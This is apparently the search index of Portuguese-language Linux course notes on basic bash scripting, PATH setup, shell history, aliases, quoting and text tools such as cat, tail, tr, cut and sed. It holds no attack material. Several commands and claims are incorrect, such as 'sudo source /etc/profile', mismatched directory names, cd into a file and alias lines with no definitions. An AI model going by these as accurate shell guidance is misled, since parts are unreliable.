criar um Shell script com todos estes comandos para rodar de uma vez s\u00f3.</p> <p>Criando o arquivo:</p> <pre><code>$ &gt; informacoes.sh\n</code></pre> <p>Inserindo os comandos nele:</p> <pre><code>#! /usr/bin/env bash\n\n whoami\n\n hostname\n\n uptime -p\n\n uname -rms\n</code></pre> <p>Setando permiss\u00e3o de execu\u00e7\u00e3o:</p> <pre><code>chmod +x informacoes.sh\n</code></pre> <p>Chamando o programa para rodar:</p> <pre><code>./informacoes.sh\n</code></pre> <p>A linha <code>#! /usr/bin/env bash</code> informa ao <code>Shell</code> qual interpretador vai rodar o script, no caso, apontamos para o <code>bash</code>. Chamamos essa linha obrigat\u00f3ria inicial de <code>Hashbang</code>ou de <code>Shebang</code>, tanto faz.</p> <p>Na maioria dos casos o programador vai usar o caminho absoluto <code>#!/bin/bash</code>, para criar a <code>hashbang</code> ao inv\u00e9s de optar pelo environment (ambiente) <code>env</code>.</p> <p>Vamos criar um arquivo de Shell script que leia, guarde e imprima um nome:</p> <p>Criamos o arquivo:</p> <pre><code>&gt; seunome.sh\n</code></pre> <p>Inserimos o conte\u00fado:</p> <pre><code>#!/usr/bin/env bash\n\nread -p \"Digite seu nome: \" nome\n\necho \"Ol\u00e1, $nome!\"\n</code></pre> <p>Setamos a permiss\u00e3o de execu\u00e7\u00e3o:</p> <pre><code>chmod +x seunome.sh\n</code></pre> <p>Chamamos \u00e1 execu\u00e7\u00e3o:</p> <pre><code>./seunome\n</code></pre> <p>Criemos outro Shell script que mostre a data e hora, hospedando no <code>/opt</code>e usando o editor <code>vim</code>:</p> <pre><code>mkdir -p /opt/Meus_Programas/\n</code></pre> <pre><code>vim /opt/Meus_Programa/Data_Hora\n</code></pre> <pre><code>#!/bin/bash\n\necho \"Este \u00e9 um Script de Teste\"\n\necho \" \"\n\ndate\n\necho \" \"\n\necho \"Fim do Script\"\n</code></pre> <p>Este script s\u00f3 roda se eu der permiss\u00e3o e rodar o comando \u00e1 partir do pr\u00f3prio diret\u00f3rio:</p> <pre><code>chmod +x /opt/Meus_Programas/Data_Hora\n</code></pre> <pre><code>cd /opt/Meus_Programas/\n</code></pre> <pre><code>./Data_Hora #./ aponta diret\u00f3rio atual\n</code></pre> <pre><code>sh Data_Hora\n</code></pre> <p>Ou</p> <pre><code>bash Data_Hora\n</code></pre> <p>Opcionalmente posso apontar o <code>PATH</code> completo no comando:</p> <pre><code>bash /opt/Meuprograma/Data_Hora\n</code></pre> <p>Tentar execut\u00e1-lo \u00e1 partir de outro diret\u00f3rio ser\u00e1 imposs\u00edvel!</p>"},{"location":"Modulo_103.1-aula01/#caminho-absoluto-x-caminho-relativo","title":"CAMINHO ABSOLUTO X CAMINHO RELATIVO:","text":"<p>CAMINHO ABSOLUTO</p> <pre><code>/opt/Meuprograma/Data_Hora\n</code></pre> <p>CAMINHO RELATIVO</p> <pre><code>cd /opt/\n</code></pre> <pre><code>cd Meus_Programas/\n</code></pre> <pre><code>cd Data_Hora\n</code></pre>"},{"location":"Modulo_103.1-aula01/#a-variavel-path-ou-caminho","title":"A VARI\u00c1VEL <code>PATH</code> ( OU CAMINHO)","text":"<p>Todo programa que roda no Terminal, est\u00e1 armazenado em algum lugar espec\u00edfico.</p> <p>Geralmente os scripts do Sistema operacional, ficam em <code>/usr/bin/</code>, <code>/usr/sbin</code>, <code>/bin</code>, etc.</p> <p>Contudo, pra que eu n\u00e3o tenha que ficar digitando o caminho completo, toda vez em que for preciso rodar um programa, como por exemplo o navegador web Firefox, foi criada a vari\u00e1vel <code>PATH</code>, contendo os caminhos de busca, para uso do Sistema operacional.</p> <p>Temos dois modos de adicionar o caminho do diret\u00f3rio onde salvei meu script, \u00e1 vari\u00e1vel <code>PATH</code>, que \u00e9 onde o Terminal busca os programas, possibilitando com que ele conste, \u00e1 partir de qualquer diret\u00f3rio onde eu estiver.</p> <p>1) MODO TRANSIT\u00d3RIO</p> <p>Leio o <code>PATH</code>padr\u00e3o:</p> <pre><code>echo $PATH\n</code></pre> <p>Adiciono meu pr\u00f3prio caminho \u00e1 ela:</p> <pre><code>PATH=$PATH:/opt/Meus_Programas\n</code></pre> <p>Leio novamente e ele est\u00e1 constando nela:</p> <pre><code>echo $PATH\n</code></pre> <p>2) MODO DEFINITIVO</p> <p>Leio o <code>PATH</code> padr\u00e3o:</p> <pre><code>echo $PATH\n</code></pre> <p>Edito o pr\u00f3prio arquivo global do Sistema operacional, adicionando o caminho do meu programa:</p> <pre><code>sudo vim /etc/profile\n</code></pre> <pre><code>PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/Meus_Programas\"\n</code></pre> <p>For\u00e7o a reconfigura\u00e7\u00e3o para efetivar a altera\u00e7\u00e3o:</p> <pre><code>sudo source /etc/profile\n</code></pre> <p>Releio o <code>PATH</code> padr\u00e3o e j\u00e1 consta o <code>/opt/Meus_Programas</code>:</p> <pre><code>echo $PATH\n</code></pre> <p>Inclusive os comandos <code>which</code> ou <code>whereis</code> tb\u00e9m j\u00e1 encontram o meu programa:</p> <pre><code>whereis Data_Hora\n\nwhich Data_Hora\n</code></pre> <p>Respondendo \u00e1 tecla <code>TAB</code> para autocompletar o nome do programa: </p> <pre><code>Data_H 2x&lt;TAB&gt;\n\nData_Hora\n</code></pre> <p>Alguns usu\u00e1rios preferem criar seus pr\u00f3prios diret\u00f3rios pessoais, ignorando a vari\u00e1vel Global <code>/etc/profile</code>, optando por usar a vari\u00e1vel local <code>.bashrc</code>, para armazenar seus pr\u00f3prios caminhos.</p> <p>Exemplo:</p> <p>Criamos o diretorio <code>/home/usuario/Programas</code>:</p> <pre><code>mkdir ~/Programas\n</code></pre> <p>Editamos a vari\u00e1vel local <code>.bashrc</code>:</p> <pre><code>sudo vim ~/.bashrc\n</code></pre> <p>Adicionamos um teste de execu\u00e7\u00e3o:</p> <pre><code>if [ -d ~/Programas ]\nthen\n   PATH=$PATH:~/Programas\nfi\n</code></pre> <p>Copia um script, como o <code>seunome.sh</code> para dentro desse diret\u00f3rio:</p> <pre><code>cp seunome.sh /home/usuario/Programas/\n</code></pre> <p>For\u00e7amos a releitura da configura\u00e7\u00e3o da vari\u00e1vel de sistema:</p> <pre><code>source .bashrc\n</code></pre> <p>Procuramos o novo caminho na vari\u00e1vel <code>PATH</code>:</p> <pre><code>env | grep PATH\n</code></pre>"},{"location":"Modulo_103.1-aula01/#criando-um-script-e-setando-no-path-do-sistema","title":"CRIANDO UM SCRIPT E SETANDO NO <code>PATH</code> DO SISTEMA","text":"<p>Fa\u00e7a os seguintes testes:</p> <pre><code>echo \"m\u00e1quina; hostname\n</code></pre> <pre><code>echo -n m\u00e1quina; hostname\n</code></pre> <pre><code>echo -n m\u00e1quina:; hostname\n</code></pre> <p>ENT\u00c3O</p> <p>Criamos o script:</p> <pre><code>vim ~/Programas/Informacoes\n</code></pre> <p>Inserimos os comandos:</p> <pre><code>#! /usr/bin/env bash\n\n# Informa\u00e7\u00f5es.sh\n# Vers\u00e3o 1.0\n# Script para capturar informa\u00e7\u00f5es do Sistema\n# 02/25\n# Eduardo Charquero\n\nclear\n\necho \"\"\n\necho \"VALIDANDO NFORMA\u00c7\u00d5ES LOCAIS:\"\n\necho \"----------------------------------\"\n\necho -n \"Usu\u00e1rio logado : \"\nwhoami\n\necho -n \"M\u00e1quina da rede: \"\nhostname\n\necho -n \"Kernel em uso  : \"\nuname -rms\n\necho -n \"Tempo ligada   : \"\nuptime -p\n\necho \"----------------------------------\"\necho \"\"\n</code></pre> <p>Setamos permiss\u00e3o de execu\u00e7\u00e3o:</p> <pre><code>chmod +x ~/Programas/Informacoes\n</code></pre> <p>Mandamos o <code>TAB</code>autocompletar e o <code>ENTER</code> para rodar:</p> <pre><code>Infor 2x&lt;TAB&gt; ENTER\n</code></pre>"},{"location":"Modulo_103.1-aula01/#dicas","title":"DICAS","text":"<p>Locais interessantes de usar para reposit\u00f3rio de seus scripts pessoais:</p> <pre><code>~/.Programas\n\n/opt\n\n/usr/local/bin\n</code></pre>"},{"location":"Modulo_103.1-aula01/#atencao","title":"ATEN\u00c7\u00c3O!!","text":"<p>N\u00c3O RODE COMANDOS OU SCRIPTS DE TERCEIROS ENCONTRADOS NA WEB, SEM SABER O QUE ELE DE FATO EST\u00c1 FAZENDO!</p> <p>CUIDADO COM O USO DE USU\u00c1RIO ROOT OU SUDO!</p> <p>Voc\u00ea foi avisado!!</p> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"Modulo_103.1-aula02/","title":"\ud83d\udc27 M\u00f3dulo \ufeff103.1 AULA 02","text":""},{"location":"Modulo_103.1-aula02/#historico-dos-comandos","title":"HIST\u00d3RICO DOS COMANDOS","text":"<p>\u00c9 poss\u00edvel acessar o hist\u00f3rico de comandos dados no terminal, clicando no direcional do teclado, para cima ou para baixo.</p> <p>Podemos usar o comando <code>history</code>, aliado ao comando <code>less</code>, para ver o conte\u00fado do cache:</p> <pre><code>history\n</code></pre> <pre><code>history | less\n</code></pre> <p>Se usar dois <code>!!</code>, ele retorna o \u00faltimo comando dado no Terminal:</p> <pre><code>!!\n</code></pre> <p>Posso aliar um <code>!</code>, mais o n\u00famero do comando que eu quero repetir:</p> <pre><code>!37\n</code></pre> <p>Quem armazena esse cache \u00e9 o arquivo <code>.bash_history</code>:</p> <pre><code>cat ~/.bash_history\n</code></pre> <p>Que pode ser esvaziado com a op\u00e7\u00e3o <code>-c</code>:</p> <pre><code>history -c\n</code></pre> <p>A vari\u00e1vel de ambiente que aponta para esse arquivo \u00e9 a <code>HISTFILE</code>:</p> <pre><code>set | grep HISTFILE\n</code></pre> <pre><code>HISTFILE=/home/usuario/.bash_history\nHISTFILESIZE=20000\n_=HISTFILE\n</code></pre> <p>Assim como a que aponta o tamanho do cache, <code>HISTSIZE</code>, em n\u00famero de linhas:</p> <pre><code>echo $HISTSIZE\n</code></pre> <pre><code>1000\n</code></pre> <p>Uma op\u00e7\u00e3o poderosa na busca de hist\u00f3rico de comandos, \u00e9 a associa\u00e7\u00e3o entre <code>ctrl+r</code> e alguma parte do comando, ao dar <code>ENTER</code>, ele roda o comando:</p> <pre><code>ctrl + r dist\n</code></pre> <pre><code>sudo apt update &amp;&amp; sudo apt dist-upgrade\n</code></pre> <p>Outro detalhe interessante, na busca pelo hist\u00f3rico de comandos, \u00e9 o uso da tecla <code>&lt;TAB&gt;</code>, que clicada 2x, vai tentando autocompletar, com op\u00e7\u00f5es, o comando que estou digitando:</p> <pre><code>histor + 2X&lt;TAB&gt;\n</code></pre>"},{"location":"Modulo_103.1-aula02/#comandos-sequenciais","title":"COMANDOS SEQUENCIAIS","text":"<p>Podemos usar comandos sequenciais com alguns direcionadores, como o <code>;</code>, o <code>&amp;&amp;</code> e o <code>||</code>.</p> <p>O <code>;</code> executa sempre, sequencialmente os comandos:</p> <pre><code>clear; date; ls\n</code></pre> <p>Enquanto o <code>&amp;&amp;</code> s\u00f3 d\u00e1 sequ\u00eancia ao pr\u00f3ximo comando se obtiver sucesso no comando anterior. se este falhar, ele n\u00e3o prossegue ao pr\u00f3ximo:</p> <pre><code>ls /tmp/naoexiste &amp;&amp; echo linux\n\nls: n\u00e3o foi poss\u00edvel acessar '/tmp/teste': Arquivo ou diret\u00f3rio inexistente\n</code></pre> <pre><code>ls /tmp/ &amp;&amp; echo linux\n</code></pre> <pre><code>kdocs_asrfirjc\nMozillaUpdateLock-6AFDA46A1A8AD48\nssh-W8FSwzdY1DB2\nsystemd-private-881a6f50d3544de58d23489a38c4214c-bluetooth.service-qpAL6j\nsystemd-private-881a6f50d3544de58d23489a38c4214c-colord.service-DB6QUM\nsystemd-private-881a6f50d3544de58d23489a38c4214c-ModemManager.service-aG3Y6H\nsystemd-private-881a6f50d3544de58d23489a38c4214c-switcheroo-control.service-67zwcx\nsystemd-private-881a6f50d3544de58d23489a38c4214c-systemd-logind.service-M8ORHo\nsystemd-private-881a6f50d3544de58d23489a38c4214c-systemd-timesyncd.service-qN7VXN\nsystemd-private-881a6f50d3544de58d23489a38c4214c-upower.service-O1RZMk\nvmware-root\nlinux\n</code></pre> <p>J\u00e1 o outro direcionador, o <code>||</code>, s\u00f3 prossegue para o pr\u00f3ximo comando se der erro no primeiro:</p> <pre><code>ls /tmp || echo linux\n\nls /tmp/naoexiste || echo linux\n</code></pre> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"Modulo_103.1-aula03/","title":"\ud83d\udc27 M\u00f3dulo \ufeff103.1 AULA 03","text":""},{"location":"Modulo_103.1-aula03/#comando-alias-which-uname-e-quoting","title":"COMANDO alias, which, uname e quoting","text":""},{"location":"Modulo_103.1-aula03/#criando-um-backup-de-qualquer-arquivo-antes-de-edicao","title":"CRIANDO UM BACKUP DE QUALQUER ARQUIVO ANTES DE EDI\u00c7\u00c3O!","text":"<p>FA\u00c7A BACKUP DE ARQUIVOS (SEMPRE!!)</p> <p>Exemplo:</p> <pre><code>$ &gt; arquivo-teste\n</code></pre> <pre><code>$ cp arquivo-teste arquivo-teste.orig\n</code></pre> <p>Ou</p> <pre><code>$ cp arquivo-teste{,.orig}\n</code></pre> <pre><code>$ cp /home/usuario/.bashrc /home/usuario/.bashrc.orig\n</code></pre> <p>Ou</p> <pre><code>$ cp .bashrc{,.orig}\n</code></pre> <pre><code>$ cp /etc/network/interfaces /etc/network/interfaces.orig\n</code></pre> <p>Ou</p> <pre><code>$ cp /etc/network/interfaces{,.orig}\n</code></pre>"},{"location":"Modulo_103.1-aula03/#o-conceito-de-alias","title":"O CONCEITO DE ALIAS","text":"<p>O <code>alias</code> \u00e9 como um apelido:</p> <pre><code>$ cat .bashrc\n</code></pre> <p>NOTE as linhas comentadas:</p> <pre><code>#alias ll\n#alias la\n#alias l\n</code></pre> <p>ENT\u00c3O para que esses aliases rodem, eu preciso descomentar, removendo o '#':</p> <pre><code>alias ll\nalias la\nalias l\n</code></pre> <p>E releio o arquivo:</p> <pre><code>$ source .bashrc\n</code></pre> <p>Ou posso seguir a orienta\u00e7\u00e3o do pr\u00f3prio <code>.bashrc</code> e crio outro arquivo, o <code>.bash_aliases</code></p> <pre><code>vim .bash_aliases\n</code></pre> <pre><code>alias ll\nalias la\nalias l\n</code></pre> <p>Releio o arquivo:</p> <pre><code>$ source .bash_aliases\n</code></pre> <p>AGORA os comandos de aliases <code>ll</code>, <code>la</code> e <code>l</code>, v\u00e3o rodar sob o <code>ls -l</code>, <code>ls -A</code> e <code>ls -CF</code></p> <p>Veja as op\u00e7\u00f5es que podem ser encontradas no manual do <code>ls</code>:</p> <pre><code>$ man ls\n</code></pre> <p>O comando <code>alias</code>, apresenta na tela todos os aliases criados no <code>Shell</code></p> <pre><code>$ alias\n</code></pre> <p>Para criar um alias TEMPOR\u00c1RIO, eu posso simplesmente criar do modo como eu crio uma vari\u00e1vel</p> <p>Exemplo:</p> <pre><code>$ alias lt='ls /tmp'\n$ alias\n$ lt\n</code></pre> <p>Para que esse alias fique definitivo, preciso adicion\u00e1-lo ao <code>.bashrc</code> OU ao <code>.bash_aliases</code></p>"},{"location":"Modulo_103.1-aula03/#o-comando-which","title":"O COMANDO <code>which</code>","text":"<p>O comando <code>which</code> varre o <code>PATH</code> em busca de bin\u00e1rios (programas) dentro desses caminhos</p> <pre><code>$ echo $PATH\n$ which echo\n</code></pre> <p>Ele lembra o comando <code>whereis</code></p> <pre><code>$ whereis echo\n$ whereis ls\n</code></pre>"},{"location":"Modulo_103.1-aula03/#o-comando-uname","title":"O COMANDO <code>uname</code>","text":"<p>O comando <code>uname</code> mostra a vers\u00e3o do <code>Kernel</code>, usada pelo Sistema Operacional:</p> <pre><code>$ uname\n</code></pre> <pre><code>$ uname -r\n</code></pre> <pre><code>$ uname -ra\n</code></pre> <pre><code>$ uname --help\n</code></pre>"},{"location":"Modulo_103.1-aula03/#o-comando-quoting-aspas-duplas-aspas-simples-e-a-barra-invertida","title":"O COMANDO <code>quoting</code> (aspas duplas \"\", aspas simples '', e a barra invertida )","text":"<p>A primeira coisa que o <code>Shell</code> faz, \u00e9 interpretar os caracteres especias e depois executar os comandos associados a eles. </p> <p>Os comandos de <code>quoting</code>, servem pra proteger os CARACTERES ESPECIAS, contra a interpreta\u00e7\u00e3o do <code>Shell</code>, imprimindo n\u00e3o seu valor associado, mas ele pr\u00f3prio.</p> <p>Exemplo:</p> <pre><code>$ echo *\n</code></pre> <p>!=</p> <pre><code>$ echo \\*\n</code></pre> <p>A barra invertida, ou barra de escape, <code>\\</code>, protege APENAS o pr\u00f3ximo caracter, imediato a ela mesma, e n\u00e3o os pr\u00f3ximos caracteres subsequentes a ela.</p> <p>Exemplo:</p> <pre><code>$ echo \\&amp; \\*\n</code></pre> <p>!=</p> <pre><code>$ echo &amp; *\n</code></pre> <p>!=</p> <pre><code>$ echo \\&amp; \\$ *\n</code></pre> <p>Outro exemplo de uso da barra invertida:</p> <pre><code>$ echo \"Curso de Linux\"\n</code></pre> <p>!=</p> <pre><code>$ echo Curso      de      Linux\n</code></pre> <p>!=</p> <pre><code>$ echo Curso\\ \\ \\ de\\ \\ \\ Linux\n</code></pre> <p>E qual \u00e9 a diferen\u00e7a, entre as ASPAS DUPLAS <code>\"\"</code>, e as ASPAS SIMPLES <code>''</code>?</p> <p>As aspas duplas <code>\"\"</code>, protegem TODOS os caracteres especiais, EXCETO o cifr\u00e3o <code>$</code>, a cr\u00e1se '<code>'</code>', e a pr\u00f3pria barra de scape <code>\\</code>.</p> <p>Ou seja, um echo <code>$\\</code> N\u00c3O FUNCIONA para prote\u00e7\u00e3o desses Caracteres Especiais</p> <p>J\u00e1 as aspas simples <code>''</code>, protegem TODOS os caracteres especiais, INCLUSIVE estes <code>$</code>, '<code>'</code>' e <code>\\</code> que as aspas duplas n\u00e3o protegem.</p>"},{"location":"Modulo_103.1-aula03/#criando-uma-variavel","title":"CRIANDO UMA VARI\u00c1VEL","text":"<pre><code>$ CIFRAO=CARACTER\n</code></pre> <p>Ao expendir com <code>echo</code> protegendo, teremos:</p> <pre><code>$ echo $CIFRAO\n</code></pre> <p>!=</p> <pre><code>$ echo '$CIFRAO'\n</code></pre> <p>NOTE que SE eu protegesse com ASPAS DUPLAS, n\u00e3o seria efetivo:</p> <pre><code>$ echo \"$CIFRAO\"\n</code></pre> <p>THAT\u2019S ALL FOLKS!!</p> <pre><code>\n</code></pre>"},{"location":"Modulo_103.1-aula04/","title":"\ud83d\udc27 M\u00f3dulo 103.1 AULA 04","text":""},{"location":"Modulo_103.1-aula04/#os-comandos-cat-head-tail-sort-less-e-wc-no-linux","title":"OS COMANDOS <code>cat</code>, <code>head</code>, <code>tail</code>, <code>sort</code>, <code>less</code> e <code>wc</code> NO LINUX","text":"<p>Os comandos <code>cat</code>, <code>head</code>, <code>tail</code>, <code>sort</code>, <code>less</code> e <code>wc</code> s\u00e3o ferramentas essenciais para manipula\u00e7\u00e3o e visualiza\u00e7\u00e3o de arquivos de texto no Linux. Cada um desses comandos tem suas pr\u00f3prias funcionalidades e casos de uso espec\u00edficos. Vamos explorar cada um desses comandos em detalhes.</p>"},{"location":"Modulo_103.1-aula04/#o-comando-cat","title":"O COMANDO <code>cat</code>","text":"<p>O comando <code>cat</code> \u00e9 usado para concatenar e exibir o conte\u00fado de arquivos.</p> <p>Sintaxe:</p> <pre><code>cat [op\u00e7\u00f5es] [arquivo]\n</code></pre> <p>Op\u00e7\u00f5es Comuns:</p> <pre><code>-n: Numera todas as linhas de sa\u00edda.\n-b: Numera apenas as linhas n\u00e3o vazias.\n-s: Suprime linhas em branco repetidas.\n</code></pre> <p>Exemplos, exibir o conte\u00fado de um arquivo:</p> <pre><code>cat arquivo.txt\n</code></pre> <p>Concatenar e exibir o conte\u00fado de m\u00faltiplos arquivos:</p> <pre><code>cat arquivo1.txt arquivo2.txt\n</code></pre> <p>Numerar todas as linhas de um arquivo:</p> <pre><code>cat -n arquivo.txt\n</code></pre>"},{"location":"Modulo_103.1-aula04/#o-comando-head","title":"O COMANDO <code>head</code>","text":"<p>O comando <code>head</code> \u00e9 usado para exibir as primeiras linhas de um arquivo.</p> <p>Sintaxe:</p> <pre><code>head [op\u00e7\u00f5es] [arquivo]\n</code></pre> <p>Op\u00e7\u00f5es Comuns:</p> <pre><code>-n: Especifica o n\u00famero de linhas a serem exibidas.\n</code></pre> <p>Exemplos: exibir as primeiras 10 linhas de um arquivo:</p> <pre><code>head arquivo.txt\n</code></pre> <p>Exibir as primeiras 5 linhas de um arquivo:</p> <pre><code>head -n 5 arquivo.txt\n</code></pre>"},{"location":"Modulo_103.1-aula04/#o-comando-tail","title":"O COMANDO <code>tail</code>","text":"<p>O comando <code>tail</code> \u00e9 usado para exibir as \u00faltimas linhas de um arquivo.</p> <p>Sintaxe:</p> <pre><code>tail [op\u00e7\u00f5es] [arquivo]\n</code></pre> <p>Op\u00e7\u00f5es Comuns:</p> <pre><code>-n: Especifica o n\u00famero de linhas a serem exibidas.\n-f: Exibe as novas linhas adicionadas ao arquivo em tempo real.\n</code></pre> <p>Exemplos: Exibir as \u00faltimas 10 linhas de um arquivo:</p> <pre><code>tail arquivo.txt\n</code></pre> <p>Exibir as \u00faltimas 5 linhas de um arquivo:</p> <pre><code>tail -n 5 arquivo.txt\n</code></pre> <p>Monitorar um arquivo em tempo real:</p> <pre><code>tail -f arquivo.txt\n</code></pre>"},{"location":"Modulo_103.1-aula04/#o-comando-sort","title":"O COMANDO <code>sort</code>","text":"<p>O comando <code>sort</code> \u00e9 usado para ordenar linhas de arquivos de texto.</p> <p>Sintaxe:</p> <pre><code>sort [op\u00e7\u00f5es] [arquivo]\n</code></pre> <p>Op\u00e7\u00f5es Comuns:</p> <pre><code>-r: Ordena em ordem inversa.\n-n: Ordena numericamente.\n-u: Remove linhas duplicadas.\n</code></pre> <p>Exemplos, ordenar as linhas de um arquivo:</p> <pre><code>sort arquivo.txt\n</code></pre> <p>Ordenar numericamente:</p> <pre><code>sort -n arquivo.txt\n</code></pre> <p>Ordenar em ordem inversa:</p> <pre><code>sort -r arquivo.txt\n</code></pre>"},{"location":"Modulo_103.1-aula04/#o-comando-less","title":"O COMANDO <code>less</code>","text":"<p>O comando <code>less</code> \u00e9 usado para visualizar o conte\u00fado de arquivos de texto de forma paginada.</p> <p>Sintaxe:</p> <pre><code>less [op\u00e7\u00f5es] [arquivo]\n</code></pre> <p>Op\u00e7\u00f5es Comuns:</p> <pre><code>-N: Exibe n\u00fameros de linha.\n-S: Desabilita o wrap de linhas longas.\n</code></pre> <p>Exemplos:</p> <p>Visualizar o conte\u00fado de um arquivo:</p> <pre><code>less arquivo.txt\n</code></pre> <p>Visualizar o conte\u00fado de um arquivo com n\u00fameros de linha:</p> <pre><code>less -N arquivo.txt\n</code></pre>"},{"location":"Modulo_103.1-aula04/#o-comando-wc","title":"O COMANDO <code>wc</code>","text":"<p>O comando <code>wc</code> \u00e9 usado para contar linhas, palavras e caracteres em arquivos.</p> <p>Sintaxe:</p> <pre><code>wc [op\u00e7\u00f5es] [arquivo]\n</code></pre> <p>Op\u00e7\u00f5es Comuns:</p> <pre><code>-l: Conta o n\u00famero de linhas.\n-w: Conta o n\u00famero de palavras.\n-c: Conta o n\u00famero de bytes.\n-m: Conta o n\u00famero de caracteres.\n</code></pre> <p>Exemplos: Contar o n\u00famero de linhas, palavras e bytes em um arquivo:</p> <pre><code>wc arquivo.txt\n</code></pre> <p>Contar apenas o n\u00famero de linhas:</p> <pre><code>wc -l arquivo.txt\n</code></pre> <p>Contar apenas o n\u00famero de palavras:</p> <pre><code>wc -w arquivo.txt\n</code></pre>"},{"location":"Modulo_103.1-aula04/#conclusao","title":"CONCLUS\u00c3O","text":"<p>Os comandos <code>cat</code>, <code>head</code>, <code>tail</code>, <code>sort</code>, <code>less</code> e <code>wc</code> s\u00e3o ferramentas poderosas para manipula\u00e7\u00e3o e visualiza\u00e7\u00e3o de arquivos de texto no Linux. </p> <p>Eles permitem que voc\u00ea realize uma ampla variedade de opera\u00e7\u00f5es de edi\u00e7\u00e3o e visualiza\u00e7\u00e3o de texto de maneira eficiente. </p> <p>Praticar com esses comandos ajudar\u00e1 voc\u00ea a se tornar mais eficiente em manipula\u00e7\u00e3o de texto no terminal.</p> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"Modulo_103.1-aula05/","title":"\ud83d\udc27 M\u00f3dulo 103.1 AULA 05","text":""},{"location":"Modulo_103.1-aula05/#comandos-tr-cut-e-sed-no-linux","title":"COMANDOS <code>tr</code>, <code>cut</code> E <code>sed</code> NO LINUX","text":"<p>Os comandos <code>tr</code>, <code>cut</code> e <code>sed</code> s\u00e3o ferramentas poderosas para manipula\u00e7\u00e3o de texto no Linux. </p> <p>Cada um deles tem suas pr\u00f3prias funcionalidades e casos de uso espec\u00edficos. </p> <p>Vamos explorar cada um desses comandos em detalhes.</p>"},{"location":"Modulo_103.1-aula05/#o-comando-tr","title":"O COMANDO <code>tr</code>","text":"<p>O comando <code>tr</code> \u00e9 usado para traduzir ou deletar caracteres. Ele l\u00ea a entrada padr\u00e3o e escreve a sa\u00edda padr\u00e3o.</p> <p>Sintaxe:</p> <pre><code>tr [op\u00e7\u00f5es] conjunto1 [conjunto2]\n</code></pre> <p>Op\u00e7\u00f5es Comuns:</p> <pre><code>\u2022 -d: Deleta caracteres. \n\u2022 -s: Substitui sequ\u00eancias de um caractere repetido por um \u00fanico caractere.\n</code></pre> <p>Exemplos: Converter letras min\u00fasculas para mai\u00fasculas:</p> <pre><code>echo \"hello world\" | tr 'a-z' 'A-Z'\n</code></pre> <p>Sa\u00edda:</p> <pre><code>HELLO WORLD\n</code></pre> <p>Deletar todos os d\u00edgitos:</p> <pre><code>echo \"123abc456def\" | tr -d '0-9'\n</code></pre> <p>Sa\u00edda:</p> <pre><code>abcdef\n</code></pre>"},{"location":"Modulo_103.1-aula05/#o-comando-cut","title":"O COMANDO <code>cut</code>","text":"<p>O comando <code>cut</code> \u00e9 usado para extrair se\u00e7\u00f5es de cada linha de arquivos.</p> <p>Sintaxe:</p> <pre><code>cut [op\u00e7\u00f5es] [arquivo]\n</code></pre> <p>Op\u00e7\u00f5es Comuns:</p> <pre><code>\u2022 -d: Especifica o delimitador. \n\u2022 -f: Seleciona campos espec\u00edficos. \n\u2022 -c: Seleciona caracteres espec\u00edficos.\n</code></pre> <p>Exemplos: Extrair o primeiro campo de um arquivo delimitado por v\u00edrgulas:</p> <pre><code>echo \"nome,idade,cidade\" | cut -d',' -f1\n</code></pre> <p>Sa\u00edda:</p> <pre><code> nome\n</code></pre> <p>Extrair os caracteres da 2\u00aa \u00e0 5\u00aa posi\u00e7\u00e3o:</p> <pre><code>echo \"Hello World\" | cut -c2-5\n</code></pre> <p>Sa\u00edda:</p> <pre><code>ello\n</code></pre>"},{"location":"Modulo_103.1-aula05/#o-comando-sed","title":"O COMANDO <code>sed</code>","text":"<p>O comando <code>sed</code> \u00e9 um editor de fluxo de texto que pode realizar opera\u00e7\u00f5es b\u00e1sicas de edi\u00e7\u00e3o de texto em um arquivo ou entrada.</p> <p>Sintaxe:</p> <pre><code>sed [op\u00e7\u00f5es] 'comando' [arquivo]\n</code></pre> <p>Op\u00e7\u00f5es Comuns:</p> <pre><code>\u2022 -i: Edita o arquivo no local. \n\u2022 -e: Adiciona um comando de script.\n</code></pre> <p>Exemplos: Substituir todas as ocorr\u00eancias de \"foo\" por \"bar\":</p> <pre><code>echo \"foo foo foo\" | sed 's/foo/bar/g'\n</code></pre> <p>Sa\u00edda:</p> <pre><code>\u2022 bar bar bar\n</code></pre> <p>Deletar linhas que cont\u00eam a palavra \"error\":</p> <pre><code>echo -e \"line1\\nerror line\\nline3\" | sed '/error/d'\n</code></pre> <p>Sa\u00edda:</p> <pre><code>line1\nline3\n</code></pre> <p>Posso converter um texto inteiro, e gerar um outro txt:</p> <pre><code>cat \"Aula01.txt\" | tr 'A-Z' 'a-z' &gt; 22.txt\n</code></pre>"},{"location":"Modulo_103.1-aula05/#exercicios","title":"EXERC\u00cdCIOS","text":"<p>Exerc\u00edcio 1: </p> <p>Uso do <code>tr</code></p> <pre><code>1. Converta todas as letras mai\u00fasculas para min\u00fasculas na string \"Hello World\". \n2. Remova todos os espa\u00e7os em branco da string \"Hello World\".\n</code></pre> <p>Exerc\u00edcio 2: Uso do <code>cut</code></p> <pre><code>1. Extraia o segundo campo de um arquivo CSV com o conte\u00fado \"nome,idade,cidade\". \n2. Extraia os caracteres da 3\u00aa \u00e0 6\u00aa posi\u00e7\u00e3o da string \"Hello World\".\n</code></pre> <p>Exerc\u00edcio 3: Uso do <code>sed</code></p> <pre><code>1. Substitua todas as ocorr\u00eancias de \"apple\" por \"orange\" na string \"apple apple apple\".\n2. Remova todas as linhas que cont\u00eam a palavra \"error\" do seguinte texto:\n2. line1\n   error line\n   line3\n</code></pre>"},{"location":"Modulo_103.1-aula05/#conclusao","title":"CONCLUS\u00c3O","text":"<p>Os comandos <code>tr</code>, <code>cut</code> e <code>sed</code> s\u00e3o ferramentas essenciais para manipula\u00e7\u00e3o de texto no Linux. </p> <p>Eles permitem que voc\u00ea realize uma ampla variedade de opera\u00e7\u00f5es de edi\u00e7\u00e3o de texto de maneira eficiente. </p> <p>Praticar com esses comandos ajudar\u00e1 voc\u00ea a se tornar mais eficiente em manipula\u00e7\u00e3o de texto no terminal.</p> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"Modulo_103.2-aula01/","title":"\ud83d\udc27 M\u00f3dulo 103.2 AULA 01","text":"<p>filtros</p>"},{"location":"Modulo_103.2-aula01/#leitura-de-arquivos-com-os-comandos-cat-tac-head-tail-less-nl-sort-e-uniq","title":"LEITURA DE ARQUIVOS COM OS COMANDOS 